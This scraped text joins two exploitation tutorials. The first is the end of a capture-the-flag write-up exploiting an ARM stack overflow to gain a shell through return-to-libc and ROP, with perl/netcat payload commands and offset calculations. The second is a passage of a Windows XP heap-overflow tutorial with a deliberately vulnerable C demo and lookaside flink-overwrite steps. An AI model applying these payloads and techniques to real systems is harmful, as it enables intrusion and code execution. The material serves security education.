vulnerability:\n* ARM host: nc -c .\/trafman -l -p 8000\n* Guest OS: perl -e 'print \"traffic_operator\\n2\\n\".\"a\"x40\n.\"\\n\".\"A\"x400 .\"\\n1\\n\".\"a\"x40 .\"\\n\"' | nc localhost 8000\nWe will analyze the crash in more detail in the next section. First, we\nreverse engineer the option menu. It's easy to locate this code because\nit's contained in the only function that main() calls. So open main and\ndouble click on the only non-library function being called. The\ntext-based interface shows only three options. However, when looking at\nthe code, we see there is a hidden option. When entering 23 the address\nof printf is displayed:\n[41][strafman_3.png]\nNotice that r0 is set to 0x8FC4 which is a pointer to the ASCII string\n\"> %p\". Register r7 is initialized in the beginning of the function\nto 0x12010. This address contains the dynamically loaded address of\nprintf. Hence, it will tell us where libc is located in memory.\nGetting Control of the Program Counter\nWe know what to do to crash the program. But we don't yet know what is\ncausing the crash, which code is responsible, and whether it's\nexploitable. To answer these questions we run the binary in a debugger.\nExecuting the following commands allows us to connect to the service\nfrom our host OS yet still debug the trafman binary itself:\n* gbc nc\n* set follow-fork-mode child\n* r -c .\/trafman -l -p 8000\nWe now trigger the crash with:\n* perl -e 'print \"traffic_operator\\n2\\n\".\"a\"x40 .\"\\n\".\"A\"x400\n.\"\\n1\\n\".\"a\"x40 .\"\\n\"' | nc localhost 8000\nThis results in a segmentation fault because it's trying to execute\ncode at 0x41414141. Executing \"x\/20x $sp\" in gdb to dump the stack\nshows that it's likely a stackoverflow vulnerability. With this alone\nwe know enough to write a functional exploit. But since we're learning\nARM we will take a look at the code that is responsible for the buffer\noverflow. We open the function that is executed when the user selects\noption 1 in the menu and reverse it.\n[42][strafman_3.png]\nWhat happens here is that each byte in the file gets read using fgetc\nuntil we are at the end of the file. In every loop the new byte is\nsaved to an array on the stack, which will eventually overflow. The\nfunction returns to the caller using a \"pop {pc}\" instruction. An\ninteresting instruction here is \"adds r0, #1\". It adds one to the\nregister r0, and updates the status (a.k.a. condition) flags according\nto the resulting value. In particular, if the result is zero (meaning\nr0 was -1), the zero flag will be set. Using the BNE instruction we\ntest for the zero flag. If it is set we exit the loop. Note that more\ninstructions can set the status flag this way, and they can be\nrecognized using the S suffix.\nSo we indeed have a classic buffer overflow (without a stack canary).\nThe return address is saved on the stack and popped on the function\nexit. Our first step in exploiting the binary is to find out where we\nhave to put the return address in our file (remember that the content\nof the file is written to the stack and parts of it will overflow the\nsaved return address). To quickly accomplish this we use the\npattern_create tool from metasploit. We again start the binary in Qemu\nas follows (I won't repeat this again):\n* gbc nc\n* set follow-fork-mode child\n* r -c .\/trafman -l -p 8000\nOn our host we execute the following commands:\n* PATRN=$(\/usr\/share\/metasploit-framework\/tools\/pattern_create.rb\n400)\n* perl -e 'print \"traffic_operator\\n2\\n\".\"a\"x40 .\"\\n\".\"'$PATRN'\"\n.\"\\n1\\n\".\"a\"x40 .\"\\n\"' | nc localhost 8000\nWe let pattern_create.rb generate a unique pattern of 400 characters.\nAs an example, a unique pattern of 20 characters would be\n\"Aa0Aa1Aa2Aa3Aa4Aa5Aa\". If we now know which bytes in this pattern get\nloaded in the program counter, we can let pattern_offset.rb calculate\nthe offset where the return address is located in our file. In gdb we\nsee it segfaults with the program counter at 0x41326a40. So we find the\noffset with the following command:\n* \/usr\/share\/metasploit-framework\/tools\/pattern_offset.rb 41326a40\nThis returns 276. So we have to put the return address 276 bytes into\nthe payload. As a quick test, execute the following command:\n* perl -e 'print \"traffic_operator\\n2\\n\".\"a\"x40 .\"\\n\".\"A\"x276\n.\"ABCD\\n1\\n\".\"a\"x40 .\"\\n\"' | nc localhost 8000\nThis will segfault with the program counter at \"ABCD\". We now need to\npoint the program counter to code that will get us a shell.\nUnfortunately the binary uses both ASLR and NX, meaning it uses random\naddresses, and we can't execute data on the stack and\/or heap.\nDefeating ASLR and NX\nOur goal is a return-to-libc attack. In particular we will attempt to\nexecute system(\"\/bin\/sh\"). Defeating ASLR is trivial due to the hidden\nmenu option which prints the address of printf. Based on the address of\nprintf we can locate the addresses of other variables and functions\nwithin the libc library. To get the address of printf and system for a\nspecific run we execute \"p printf\" and \"p system\" in gdb. This gives:\n* system: 0x76f2aa38\n* printf: 0x76f347d4\nThere is one catch: gdb says these functions are located at an even\naddress. However, the functions are actually Thumb code! So make sure\nthat the correct processor mode is used when executing these functions\n(if necessary make the addresses uneven). Anyway, the hidden menu\noption returns an uneven address, hence to get the address of system we\ntake the address of printf and substract 0x9D9C from it.\nSo we can call system, but still need to pass an argument to it. There\nare two steps to accomplish this, first we need to find out where in\nmemory the string \"\/bin\/sh\" is located, then we need to find a way to\nput a pointer to this string into register r0 (recall that r0 contains\nthe first argument of a function).\nFinding a \"\/bin\/sh\" string it easy. Internally the system() function\nuses it as well, so it's located in the libc library. To quick find it\nexecute the following in gdb:\n* find &system, +99999999, \"\/bin\/sh\"\nIn my particular instance this returned 0x76fc6528. So to dynamically\nget the address of \"\/bin\/sh\" we take the address of printf and add\n0x91D53 to it (again remember that the hidden option returns the uneven\naddress). To load this pointer into r0 with NX enabled we will use\nreturn-oriented-programming (ROP).\nWe will use ROP gadgets located in the libc library, because that's the\nonly library we know the addresses of. Within the library we have to\nfind gadgets which set r0 and let us return to the system function. To\ndo this I transferred libc.so.6 to the host and executed:\n* arm-linux-objdump -d libc.so.6 | grep \"pop.*r0.*pc\"\nTo install the arm-linux-* tools see [43]IO SmashTheStack. There are\nlikely better tools to find usable gadgets, but this quick and dirty\nmethod got the job done. Important is to search for both Thumb and ARM\ngadgets! Forcing Thumb mode can be done using -Mforce-thumb. The most\ninteresting gadget found was:\n* 5a7bc: pop  {r0, r4, pc}\nRemark that this is ARM instruction. In objdump printf is located at\n0x387d4. I found this by executing:\n* arm-linux-objdump -d libc.so.6 | grep \"printf>:\"\nSo to dynamically get the location of the gadget we take the location\nof printf and add 0x21FE8 to it. Good, we now have everything in place\nto trigger the overflow and make it execute system(\"\/bin\/sh\").\nCombining all findings results in [44]the following exploit, where I\nwrote the nclib myself and its functionality should be\nself-explanatory. When executing the exploit it looks like this:\n[45][strafman_4.png]\nDONE. FINALLY! :D\nGeplaatst door [46]Mathy op [47]17:09\n[48]Email This[49]BlogThis![50]Share to Twitter[51]Share to\nFacebook[52]Share to Pinterest\nLabels: [53]exploits, [54]tutorials\n[55]Newer Post [56]Older Post [57]Home\nBlog Archive\n* [58]\u25ba  [59]2023 (1)\n+ [60]\u25ba  [61]August (1)\n* [62]\u25ba  [63]2021 (1)\n+ [64]\u25ba  [65]May (1)\n* [66]\u25ba  [67]2020 (3)\n+ [68]\u25ba  [69]September (1)\n+ [70]\u25ba  [71]July (1)\n+ [72]\u25ba  [73]June (1)\n* [74]\u25ba  [75]2019 (1)\n+ [76]\u25ba  [77]September (1)\n* [78]\u25ba  [79]2018 (3)\n+ [80]\u25ba  [81]June (2)\n+ [82]\u25ba  [83]March (1)\n* [84]\u25ba  [85]2017 (1)\n+ [86]\u25ba  [87]February (1)\n* [88]\u25ba  [89]2016 (1)\n+ [90]\u25ba  [91]March (1)\n* [92]\u25ba  [93]2015 (3)\n+ [94]\u25ba  [95]October (1)\n+ [96]\u25ba  [97]September (1)\n+ [98]\u25ba  [99]March (1)\n* [100]\u25ba  [101]2014 (2)\n+ [102]\u25ba  [103]September (1)\n+ [104]\u25ba  [105]May (1)\n* [106]\u25bc  [107]2013 (5)\n+ [108]\u25bc  [109]December (1)\no [110]Reversing and Exploiting ARM Binaries: rwthCTF\nTra...\n+ [111]\u25ba  [112]November (1)\n+ [113]\u25ba  [114]June (1)\n+ [115]\u25ba  [116]April (1)\n+ [117]\u25ba  [118]February (1)\n* [119]\u25ba  [120]2012 (9)\n+ [121]\u25ba  [122]November (1)\n+ [123]\u25ba  [124]September (1)\n+ [125]\u25ba  [126]August (1)\n+ [127]\u25ba  [128]July (1)\n+ [129]\u25ba  [130]June (1)\n+ [131]\u25ba  [132]May (1)\n+ [133]\u25ba  [134]February (2)\n+ [135]\u25ba  [136]January (1)\n* [137]\u25ba  [138]2011 (5)\n+ [139]\u25ba  [140]October (3)\n+ [141]\u25ba  [142]August (2)\nSubscribe To\n[arrow_dropdown.gif] Posts\n[143][subscribe-netvibes.png] [144][subscribe-yahoo.png]\n[145][icon_feed12.png] Atom\n[arrow_dropdown.gif] Posts\n[arrow_dropdown.gif] Comments\n[146][subscribe-netvibes.png] [147][subscribe-yahoo.png]\n[148][icon_feed12.png] Atom\n[arrow_dropdown.gif] Comments\nPopular Posts\n* [149]WhatsApp Considered Insecure (2012)\n* [150]Understanding the Heap & Exploiting Heap Overflows\n* [151]How MAC Address Randomization Works on Windows 10\n* [152]Exploiting 'INSERT INTO' SQL Injections Ninja Style\n* [153]Reversing and Exploiting ARM Binaries: rwthCTF Trafman\nPowered by [154]Blogger."}
{"text":"[1][logo.png]\n* [2]Home\n* [3]Tutorials\n* [4]Scripting\n* [5]Exploits\n* [6]Links\n* [7]Patreon\n* [8]Contact\n__________________________________________________________________\n*\n* [9]Home \u00bb\n* [10]Tutorials \u00bb\n* Heap Overflows For Humans 102\n(BUTTON) [11][become_a_patron_button.png]\nHeap Overflows For Humans 102\nInitially I discussed techniques for exploiting heap overflows in older\nversions of Windows in an attempt to give the reader a practical\nworking knowledge of how the unlink process works and how flink\/blink\nfrom freelist[n] can be controlled to give the attacker an arbitrary\nwrite 4 primitive.\nThe primary purpose of this article is to re-educate myself (I'm\nforgetful) and to help security professionals continue in obtaining a\ngrasp on the technical understandings of how the heap manager works\nunder older versions of windows (NT v5 and below). This is done in\norder to exploit heap overflows or memory corruptions vulnerabilities\nand bypass specific mitigations aimed at preventing the generic \"write\n4\". It also serves the purpose for the reader to establish a benchmark\nof knowledge that would no doubt be needed in order to attack newer\nwindows heap implementations.\nThis tutorial will discuss in detail only one well-known application\nspecific technique for bypassing Windows XP SP2\/SP3 heap protection\nmechanisms. Therefore, it is no way a definitive guide, nor will it\ncover every aspect of the heap.\nTo continue, a somewhat solid understanding of how heap structures work\nin windows XP\/Server 2003 is required. For the purposes of this\ntutorial alone, and based upon feedback from Heap Overflow for Humans\n101, I will discuss some aspects of how the heap internals work under\nthis environment.\nIf you are unfamiliar with heap based buffer overflows, at least at a\nbasic level, then it is suggested that you focus in this area first. To\nfollow along you will need:\n- Windows XP with just SP1 installed.\n- Windows XP with just SP2\/SP3 installed.\n- A debugger ([12]Olly Debugger, [13]Immunity Debugger, [14]windbg with\naccess to the ms symbol server etc).\n- A c\/c++ compilier ([15]Dev C++, [16]lcc-32, MS visual C++ 6.0 (if you\ncan still get it)).\n- A scripting language of ease (I use [17]python, maybe you can use\n[18]perl).\n- A [19]brain (and\/or persistence).\n- Some knowledge of [20]Assembly, C and knowledge on how to dig through\na debugger using HideDbg (plugin) for Olly or !hidedebug under immunity\ndebugger.\n- Time.\nGrab a coffee and let\u2019s investigate this mysterious black art.\nSo what exactly is a chunk and a block?\nBy default, Windows has a specific structure for the heap. At offset\n0x90 in the PEB, you can see a listing of heaps for the given process\nin an ordered array structure (in chronological order). Lets look at\nsome heap structures:\nUsing Windbg we can find the current PEB by using !peb. If you are a\nImmunity Debugger user, you can also view this information by using\n!peb. The very simple code provided for !peb is below.\nfrom immlib import *\ndef main(args):\nimm = Debugger()\npeb_address = imm.getPEBAddress()\ninfo = 'PEB: 0x%08x' % peb_address\nreturn info\nOnce we are in the PEB we can see the process heaps:\n+0x090 ProcessHeaps : 0x7c97ffe0 -> 0x00240000 Void\nLets dump dword's at that pointer location 0x7c97ffe0\n0:000> dd 7c97ffe0\n7c97ffe0 00240000 00340000 00350000 003e0000\n7c97fff0 00480000 00000000 00000000 00000000\n7c980000 00000000 00000000 00000000 00000000\n7c980010 00000000 00000000 00000000 00000000\n7c980020 02c402c2 00020498 00000001 7c9b2000\n7c980030 7ffd2de6 00000000 00000005 00000001\n7c980040 fffff89c 00000000 003a0043 0057005c\n7c980050 004e0049 004f0044 00530057 0073005c\nThe addresses in bold are the current heaps that are running in this\nprocess. This information can also be found in windbg and Immunity\nDebugger by using the command !heap.\n[heaps.png]\nAdditionally, you can view statistical information regarding each heap\nusing the !heap -stat command in windbg. Below is the example output of\nthis:\n_HEAP 00030000\nSegments 00000002\nReserved bytes 00110000\nCommitted bytes 00014000\nVirtAllocBlocks 00000000\nVirtAlloc bytes 00000000\nFinally, you can dump some meta data regarding the heap using the -h\nand -q flag in Immunity Debugger.\n[heapmetadata.png]\nThe first heap (0x00240000) is the default heap, while the other heaps\nare created from C components or constructs. The last heap in the\noutput (0x00480000) was created by our application.\nThe application may use a call like HeapCreate() to create the\nadditional heap(s) and store the pointers at offset 0x90 in the PEB.\nThe following displays the Windows API for HeapCreate().\nHANDLE WINAPI HeapCreate(\n__in DWORD flOptions,\n__in SIZE_T dwInitialSize,\n__in SIZE_T dwMaximumSize\n);\nA call to HeapCreate() with the correct parameters will return a\npointer to the created heap stored in the EAX register.\nThe arguments are as follows:\nflOptions\n+ HEAP_CREATE_ENABLE_EXECUTE: allow the execution of application code)\n+ HEAP_GENERATE_EXCEPTIONS: An exception is raised when a call to HeapAl\nloc() or HeapReAlloc() is\ncalled and can\u2019t be fulfilled\n+ HEAP_NO_SERIALIZE: Serialized access is not used when the heap functio\nns access this heap\ndwInitialSize\n+ The initial size that is committed for the heap rounded up to the near\nest page size (4k). If 0\nis specified, then a single page size for the heap is set. The value m\nust be smaller than\ndwMaximumSize.\ndwMaximumSize\n+ The maximum size of the heap. If requests are made to HeapAlloc() or H\neapReAlloc() that exceed\nthe dwinitialSize value, then the virtual memory manager will return p\nage(s) of memory that will\nfill the allocation request and the remainder of memory will be stored\nin the freelist. If\ndwMaximumSize is 0, the heap can grow in size. The heap's size is limi\nted only by the available\nmemory.\nMore information on the flags can be found at [21]msdn. Below is an\ntable of the heap structure with important locations highlighted. You\ncan use the command 'dt _heap' in windbg to view this information.\nAddress    Value      Description\n0x00360000 0x00360000 Base Address\n0x0036000C 0x00000002 Flags\n0x00360010 0x00000000 ForceFlags\n0x00360014 0x0000FE00 VirtualMemoryThreshold\n0x00360050 0x00360050 VirtualAllocatedBlocks List\n0x00360158 0x00000000 FreeList Bitmap\n0x00360178 0x00361E90 FreeList[0]\n0x00360180 0x00360180 FreeList[n]\n0x00360578 0x00360608 HeapLockSection\n0x0036057C 0x00000000 Commit Routine Pointer\n0x00360580 0x00360688 FrontEndHeap\n0x00360586 0x00000001 FrontEndHeapType\n0x00360678 0x00361E88 Last Free Chunk\n0x00360688 0x00000000 Lookaside[n]\nHeap segments\nAs mentioned before, every heap chunk is stored in a heap segment. If a\nchunk of memory is freed, it will be added to the freelist or lookaside\nlist in addition to being stored in the heap segment. When allocating,\nif the heap manager can't find any available free chunks in the\nlookaside or the freelist, it will 'commit' more memory to the current\nheap segment from the uncommitted space. A heap structure can have many\nsegments if lots of memory is being committed due to many allocations.\nBelow is an table showing the segment chunk structure.\nHeader Self Size (0x2) Prev Size (0x2) Segment index (0x1) Flag (0x1)\nUnused (0x1) Tag index (0x1)\nData\nWhen analysing heap segments, we use the '!heap -a [heap address]'\ncommand in windbg.\n[heap-segments.png]\nAdditionally you can use the '!heap -h [heap address] -c' in immunity\ndebugger (the -c flag show chunks)\n[displaying_chunks.png]\nEach segment contains its own meta data followed by the chunks of data\ninside the segment. This is the committed memory of the segment, and\nfinally the segment contains a section of uncommitted memory. Now that\nwe know the segment we want to analyse, we can use the command 'dt\n_heap_segment [segment address]' to dump the meta data structure.\n[heap_segment.png]\nBelow is a detailed table containing the structure of the segment meta\ndata. For simplicity, we will start the address range at 0x00480000.\nAddress    Value      Description\n0x00480008 0xffeeffee Signature\n0x0048000C 0x00000000 Flags\n0x00480010 0x00480000 Heap\n0x00480014 0x0003d000 LargeUncommitedRange\n0x00480018 0x00480000 BaseAddress\n0x0048001c 0x00000040 NumberOfPages\n0x00480020 0x00480680 FirstEntry\n0x00480024 0x004c0000 LastValidEntry\n0x00480028 0x0000003d NumberOfUncommitedPages\n0x0048002c 0x00000001 NumberOfUncommitedRanges\n0x00480030 0x00480588 UnCommitedRanges\n0x00480034 0x00000000 AllocatorBackTraceIndex\n0x00480036 0x00000000 Reserved\n0x00480038 0x00381eb8 LastEntryInSegment\nThe important information in a segment is the first chunk. This\ninformation alone can be used to 'walk' the segment, as you can display\nthe chunk and the next chunks simply by knowing the size and\ngranularity.\nThe back-end allocator - Freelist\nAt offset 0x178 of the heap structure, we can see the start of the\nFreeList[] array. The FreeList contains a doubly linked list of chunks.\nThey are doubly linked due to containing both flink and blink.\n[freelist.png]\nThe above diagram shows that the freelist contains an indexed array of\nheap chunks ranging from 0-128. Any chunk sizes between 0 and 1016 (its\n1016 because the maximum size is 1024 - 8 bytes of metadata) are stored\naccording to their allocated unit size * 8. For example, say that I\nhave a chunk of 40 bytes to free, then I would place the chunk at index\n4 of the freelist (40\/8).\nIf a chunk size was above 1016 ( 127 * 8 ) bytes, then it would be\nstored in the freelist[0] entry in numerical size ordering. Below is a\ndescription of the freelist chunk.\nHeaders Self Size (0x2) Prev Size (0x2) Segment index (0x1) Flag (0x1)\nUnused (0x1) Tag index (0x1)\nflink\/blink Flink (0x4) Blink (0x4)\nData\nMicrosoft released some mitigations to prevent attacks on unlinking of\nthe freelist entry, below is a short description of the mitigations.\nSafe unlinking of the freelist:\nSafe unlinking is a protection mechanism implemented by Microsoft in\nWindows XP Sp2 and above. Essentialy it is an exploitation mitigation\nthat attempts to prevent the generic write 4 technique as discussed in\nHeap Overflows for Humans 101. In this check, the previous chunks\n'flink' points to our allocated chunk and the adjacent chunks blink\npoints to our allocated chunk. Below is a description and diagram of\nthe security mechanism in place.\nFreelist chunk 1[flink] == Freelist chunk 2 && Freelist chunk 3[blink] ==Freelis\nt chunk 2\n[safe_unlinking.png]\nThe lines indicted with red is where the check is performed.\n[safe_unlinking_debug.png]\nIf any of the checks fail, then a jump to 0x7c936934 is made into\nntdll.dll. As you can see it is almost the same as our traditional\nunlink except that we have added code that checks the flink\/blink.\nFreelist header cookies:\nThe introduction of Windows XP SP2 saw a random heap cookie placed\ninside the chunk headers at offset 0x5. Only the freelist chunks have\nthese cookie checks. Below is an image of a heap chunk with the\nsecurity cookie highlighted. This is a random single byte entry and as\nsuch has a maximum possible randomization of 256 possible values. Keep\nin mind that you might be able to bruteforce this value in a multi\nthreaded environment.\n[heap_cookies.png]\nThe frontend allocator - Lookaside\nThe lookaside list is a singly linked list used to store heap chunks\nthat are under 1016 bytes (max: 1016+8). The idea behind the lookaside\nlist is to enable speed and rapid lookup time. This is because\napplications execute multiple HeapAlloc()'s and HeapFree()'s during the\nprocesses run-time. Because it was designed for speed and efficiency,\nit allows no more than 3 free chunks per list entry. If HeapFree() is\ncalled on a chunk and there are already 3 entries for that particular\nchunk size, then it is freed to the Freelist[n].\nThe heap chunk size is always calculated to the actual size of the\nallocation + an additional 8 bytes due to its header. So if the\nallocation is made for 16 bytes, then the lookaside list would be\nscanned for chunk sizes of 24 bytes (16 + chunk header). In the case of\nthe below diagram, the windows heap manager would succeed and find an\navailable chunk at index 2 of the lookaside list.\nThe lookaside list contains only an flink pointing to the next\navailable chunk (user data).\nHeaders Self Size (0x2) Prev Size (0x2) Cookie (0x1) Flags (0x1) Unused\n(0x1) Segment index (0x1)\nflink\/blink Flink (0x4)\nData\n[lookaside.png]\nWhen the windows heap manager gets an allocation request, it looks for\na free chunks of heap memory that can fulfil the request. For\noptimization and speed, the windows heap manager will first walk the\nlookaside list to begin with (due to its singly linked list structure)\nand try to find a free chunk. If the chunk is not found here, the\nwindows heap manager will try the back-end allocator. This is where the\nheap manager will walk the freelist (between\nfreelist[1]-freelist[127]). If no chunk is found, then it will walk the\nfreelist[0] entry for a larger chunk and then split the chunk. A\nportion will be returned to the heap manager and the rest will return\nto freelist[n] (n is the index based on the remaining bytes in size).\nThis brings us to the next section, heap operations.\nBasic Heap Operations\nChunk splitting:\nChunk splitting is the process of accessing freelist[n] for a sizeable\nchunk and breaking it down into smaller chunks. When a chunk is\naccessed at the freelist that is bigger than the requested allocation\nsize, the chunk will be split in half to meet the requested allocation\nsize.\nSuppose at freelist[0] this is a single chunk of size 2048 bytes. If\nthe requested allocation size is 1024 bytes (including the header),\nthen the chunk is split and the 1024 byte chunk size is put back into\nfreelist[0] whilst returning the newly allocated chunk of 1024 bytes to\nthe caller.\nHeap Coalescing:\nHeap coalescing is the act of joining together two adjacent chunks of\nheap memory that are free when the centre chunk is also freed.\nThe reason why the heap manager will do this is to perform effective\nuse of the segment memory. Of course, there is a trade off on\nefficiency when chunks are freed. Heap coalescing is a very important\noperation because multiple chunks can be added together (once free) and\nbe used for other allocations of a larger size later on. If this\nprocess didn't happen, then wasted chunks would occur in the heap\nsegment and would be fragmented.\nTechniques for bypassing Windows XP SP2\/3 security mechanisms\nOverwriting a chunk of the lookaside:\nThis technique is the most common technique to bypass heap cookies and\nsafe unlinking checks. While this is an application specific technique\nto achieve a write 4 primitive, some applications may allow you to\ndetermine the heap layout enough for reliable exploitation. Since no\nsafe unlinking or cookie checks occur in the lookaside list, an\nattacker can overwrite the 'flink' value contained within an adjacent\nlookaside entry and return that pointer via a HeapAlloc() or HeapFree()\ncall only to later write malicious code in the next available chunk.\nLets see how this works visually, breath in deep.\n1. We start by allocating chunk (A) in the current segment.\n[1.png]\n2. Next we allocate another chunk (B) in the same segment\n[2.png]\n3. Now we free chunk (B) to the lookaside list, so that two entries\nexist, one for the segment and one for the lookaside list.\n[3.png]\n4. Now we overflow chunk (A) (That will later overflow into chunk B and\nupdate its flink). This is the meta data that will be overwritten.\n[4.png]\n5. Now we allocate chunk (B) again (by allocating a chunk the same size\nas chunk B from step 2). This will return the pointer for chunk (B) and\nupdate its reference in the current heap segment and be ready for the\nnext allocation. Now the flink is updated in chunk (B) to an arbitrary\naddress that the attacker controls from the overflow of chunk (A).\n[5.png]\n6. Now we take control by allocating chunk (C). This will be the next\navailable chunk after chunk (B) and as such, be pointed too by chunk\n(B)'s controlled flink. The attacker fills chunk (C) with their\nshellcode.\n[6.png]\nOnce this process is complete, we have control of an overwritten\nfunction pointer that will ideally get called after our write 4\ncontrol. Below is the C code that we will demonstrate with.\n\/*\nOverwriting a chunk on the lookaside example\n*\/\n#include <stdio.h>\n#include <windows.h>\nint main(int argc,char *argv[])\n{\nchar *a,*b,*c;\nlong *hHeap;\nchar buf[10];\nprintf(\"----------------------------\\n\");\nprintf(\"Overwrite a chunk on the lookaside\\n\");\nprintf(\"Heap demonstration\\n\");\nprintf(\"----------------------------\\n\");\n\/\/ create the heap\nhHeap = HeapCreate(0x00040000,0,0);\nprintf(\"\\n(+) Creating a heap at: 0x00%xh\\n\",hHeap);\nprintf(\"(+) Allocating chunk A\\n\");\n\/\/ allocate the first chunk of size N (<0x3F8 bytes)\na = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);\nprintf(\"(+) Allocating chunk B\\n\");\n\/\/ allocate the second chunk of size N (<0x3F8 bytes)\nb = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);\nprintf(\"(+) Chunk A=0x00%x\\n(+) Chunk B=0x00%x\\n\",a,b);\nprintf(\"(+) Freeing chunk B to the lookaside\\n\");\n\/\/ Freeing of chunk B: the chunk gets referenced to the lookaside list\nHeapFree(hHeap,0,b);\n\/\/ set software bp\n__asm__(\"int $0x3\");\nprintf(\"(+) Now overflow chunk A:\\n\");\n\/\/ The overflow occurs in chunk A: we can manipulate chunk B's Flink\n\/\/ PEB lock routine for testing purposes\n\/\/ 16 bytes for size, 8 bytes for header and 4 bytes for the flink\n\/\/ strcpy(a,\"XXXXXXXXXXXXXXXXAAAABBBB\\x20\\xf0\\xfd\\x7f\");\n\/\/ strcpy(a,\"XXXXXXXXXXXXXXXXAAAABBBBDDDD\");\ngets(a);\n\/\/ set software bp\n__asm__(\"int $0x3\");\nprintf(\"(+) Allocating chunk B\\n\");\n\/\/ A chunk of block size N is allocated (C). Our fake pointer is returne\nd\n\/\/ from the lookaside list.\nb = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);\nprintf(\"(+) Allocating chunk C\\n\");\n\/\/ set software bp\n__asm__(\"int $0x3\");\n\/\/ A second chunk of size N is allocated: our fake pointer is returned\nc = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);\nprintf(\"(+) Chunk A=0x00%x\\n(+)Chunk B=0x00%x\\n(+) Chunk C=0x00%x\\n\",a,b\n,c);\n\/\/ A copy operation from a controlled input to this buffer occurs: these\n\/\/ bytes are written to our chosen location\n\/\/ insert shellcode here\ngets(c);\n\/\/ set software bp\n__asm__(\"int $0x3\");\nexit(0);\n}\nThe reason why we have a few __asm__(\"int $0x3\"); instructions is to\nset software breakpoints to pause execution within the debugger.\nAlternatively you can open the compiled binary in the debugger and set\nbreakpoints at each of the calls. Build the code in dev c++ (it uses\nAT&T in-line assembly compiling with gcc.exe). When running the code we\nhit the first break point while in the debugger, lets take a look.\n[heap_sample_app_immunity1.png]\nWe can see that we have two allocated chunks in the segment 0x00480000\nat the size of 0x18. If we subtract 0x8 bytes from that value we are\nleft with 0x10 or 16 bytes. Lets take a look at the lookaside and see\nif we actually freed chunk (B) too that location.\n[dump_lookaside1.png]\nExcellent! So we can see our chunk on the lookaside, (less 8 bytes so\nit points to the header). This chunk got freed to this location due to\nits size being < 1016 and there being <= 3 chunks in the lookaside for\nthat particular chunk size.\nJust to be sure, lets take a look at the freelist and see what's up.\n[freelist_analysis.png]\nOk so it seems straight forward, no entries except some at freelist[0]\nwhich is normal on creation of a segment and a few allocations.\nPressing along, we overflow chunk A with some 0x41's to overflow the\nchunk, and the adjacent chunks header. With the same data, we will\noverflow the adjacent chunks flink using 0x44's.\n[heap_overflow.png]\nGreat so we can see that our allocation at 0x00481ea8-0x8 (chunk B) has\nbeen overwritten by the attackers input. We can also see the lookaside\nentry contains the value 0x4444443c. If we add 0x8 bytes to this value,\nit will become 0x44444444, the exact value we just used! So at this\npoint, you can understand how you are controlling the flink of chunk B.\n:)\nOnce an allocation for the same size as chunk B (0x00481ea8-0x8) has\nbeen made, chunk B's entry will be removed from the lookaside[3] entry\nand returned to the caller. Note that additionally, the headers are\nunder our full control as well.\n[overflowed_chunkA.png]\nSo if we have a look at chunk A (0x00481e88) we can see the chunk is in\nuse because the flag is set to 0x1 (indicating that it is busy). The\nnext chunk at (0x00481ea0) is not updated yet as it is still freed at\nthis point to the lookaside.\n[returning_flink.png]\nAt this point, the code will access violate on a READ operation. When\nattacking an application using this technique, we would replace the\n0x44444444 with a function pointer (faking flink). Now, when the heap\nmanager creates the next allocated chunk, the application will write at\nthe location of the fake flink. We would now allocate chunk C and fill\nthe buffer with arbitrary shellcode. The idea at this point is to have\nour function pointer called before the application crashes (or called\ndue to the crash ;)). One very clever trick I did not mention in Heap\nOverflow for Humans 101 is that the attacker can use the PEB global\nfunction pointers (before XP SP1 only). However in windows XP SP2 and\nabove, these address pointers are now randomized. Lets check this out,\non loading the binary in the debugger the first time we see this:\n[got.png]\nNow lets do it again:\n[got1.png]\nNote that the two PEB addresses are different. When an exception\noccurs, the exception dispatcher will likely call ExitProcess() which\nwill in turn, call RtlAcquirePebLock(). This operation is conducted so\nthat no modifications are made to the peb during the exception and once\nthe handler is finished being dispatched, it will release the lock via\na call to RtlReleasePebLock(). Additionally, the pointers used within\nthese functions are not W|X protected meaning that we can write and\nexecute in that memory region. Each of these functions make use of\nstatic pointers with a fixed offset from the peb. Below is the\nRtlAcquirePebLock() function and as you can see, FS:[18] (peb) is moved\ninto EAX. Then at offset 0x30, the global function pointers are stored\nand at offset 0x24 is the function 'FastPebLockRoutine()' that will be\ncalled.\n7C91040D > 6A 18            PUSH 18\n7C91040F   68 4004917C      PUSH ntdll.7C910440\n7C910414   E8 B2E4FFFF      CALL ntdll.7C90E8CB\n7C910419   64:A1 18000000   MOV EAX,DWORD PTR FS:[18]\n7C91041F   8B40 30          MOV EAX,DWORD PTR DS:[EAX+30]\n7C910422   8945 E0          MOV DWORD PTR SS:[EBP-20],EAX\n7C910425   8B48 20          MOV ECX,DWORD PTR DS:[EAX+20]\n7C910428   894D E4          MOV DWORD PTR SS:[EBP-1C],ECX\n7C91042B   8365 FC 00       AND DWORD PTR SS:[EBP-4],0\n7C91042F   FF70 1C          PUSH DWORD PTR DS:[EAX+1C]\n7C910432   FF55 E4          CALL DWORD PTR SS:[EBP-1C]\n7C910435   834D FC FF       OR DWORD PTR SS:[EBP-4],FFFFFFFF\n7C910439   E8 C8E4FFFF      CALL ntdll.7C90E906\n7C91043E   C3               RETN\nBelow we can see the function RtlReleasePebLock() directly calls the\nfunction pointer 'FastpebUnlockRoutine()' at offset 0x24 of the global\narray offset within the peb.\n7C910451 > 64:A1 18000000   MOV EAX,DWORD PTR FS:[18]\n7C910457   8B40 30          MOV EAX,DWORD PTR DS:[EAX+30]\n7C91045A   FF70 1C          PUSH DWORD PTR DS:[EAX+1C]\n7C91045D   FF50 24          CALL DWORD PTR DS:[EAX+24]\n7C910460   C3               RETN\nSo when the RtlAcquirePebLock() and RtlReleasePebLock() routines are\ncalled once an exception occurs, the code will continually trigger an\nexception and execute your code at infinitum. However you can patch the\npeb by executing your shellcode and then modifying the pointer location\nto point to exit() instead.\n[dumping_the_peb.png]\nThe more threads in the current process, the less randomization there\nis (the randomized addresses will be used for multiple PEB's) and we\nwould be able to 'guess' the address of the current PEB. However the\nproblem still lies in the fact that we do not have a reliable function\npointer to overwrite for our write 4 primitive (a generic function\npointer). Some times an application may use a custom function pointer\neither before an exception occurs or a function pointer in another\nwindows library is called and this can be leveraged to overwrite that\npointer with our code and execute the shellcode.\nSpecific pointer exploitation:\nFor the purpose of demonstration, I will perform the overwriting a\nchunk on the lookaside under windows XP SP1 due to the fixed PEB Global\nfunction pointers. The 